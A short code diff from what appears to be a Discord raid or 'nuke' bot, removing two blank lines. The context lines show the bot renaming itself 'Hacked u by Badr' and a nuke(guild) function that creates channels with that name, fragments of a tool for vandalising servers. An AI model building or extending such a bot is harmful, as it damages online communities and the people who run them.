@@ -41,7 +41,6 @@ var x1 = "1"
 LOka.on('message', message => {
      if (message.content === ".") {
 LOka.user.setUsername("Hacked u by Badr")
-
 }
 });
 LOka.on('message', message => {
@@ -441,7 +440,6 @@ async function nuke(guild) {
       await guild.createChannel('Hacked u by Badr', 'voice');
 
   
-
 }
 
 LOka.on('ready', () => {
